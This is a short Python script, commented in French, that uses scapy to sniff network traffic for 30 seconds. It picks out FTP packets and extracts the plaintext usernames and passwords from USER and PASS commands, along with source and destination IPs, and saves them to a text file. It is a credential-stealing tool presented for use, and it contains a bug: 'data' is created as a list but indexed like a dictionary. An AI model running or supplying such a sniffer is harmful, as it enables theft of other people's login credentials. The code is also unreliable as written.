from scapy.all import *
import sys

#-------------------------
# TROUVER LES TRAMES FTP
#-------------------------

def trouver_trames_ftp(p):
    if p.haslayer('TCP') and p.haslayer('Raw'):
        if p['TCP'].sport == 21 or p['TCP'].dport == 21:
            return p
    return 0

#----------------------------------------------
# TROUVER USER ET PASS ET EXTRAIRE LES DONNEES
#----------------------------------------------

def isoler_identifiants(trame):
    contenu = str(trame['Raw'].load.strip()) #On supprime les caractères spéciaux du data
    if 'USER' in contenu:
        login = contenu.split()[1] #On garde le dernier mot 
        login = login[:-1] #On supprime le ' à la fin de la chaîne
        data['login'].append(login)
        data['src'].append(trame['IP'].src)
        data['dst'].append(trame['IP'].dst)
    if 'PASS' in contenu:
        mdp = contenu.split()[1]
        mdp = mdp[:-1]
        data['mdp'].append(mdp)

#------------------------------------------
# ECRITURE DES RESULTATS DANS FICHIER TXT
#------------------------------------------

def ecrire_fichier_txt(data):
    login = data['login']
    mdp = data['mdp']
    src = data['src']
    dst = data['dst']
    
    fichier = open("ftp.txt", "a")
    row = 0
    
    while row < len(login):
        fichier.write("IP SRC : ")
        fichier.write(src[row])
        
        fichier.write("\nIP DST : ")
        fichier.write(dst[row])
        
        fichier.write("\nUSER : ")
        fichier.write(login[row])
        
        fichier.write("\nPASS : ")
        fichier.write(mdp[row])
        
        fichier.write("\n-----------------------\n")
        row = row+1
    fichier.close()
    print("Données sauvegardés dans le fichier ftp.txt")

#--------------------------------
# ----- PROGRAMME PRINCIPAL -----
#--------------------------------
def main(pLogin):
    #On parcours chaque trame et on garde celles sur le port 21 (FTP)
    trame = trouver_trames_ftp(pLogin)
    if trame != 0:
        #On cherche les trames contenant le login et le mdp
        isoler_identifiants(trame)
            
        
data = [] #Les données
sniff(prn=main, timeout=30)
#Ecriture dans un fichier txt
ecrire_fichier_txt(data)
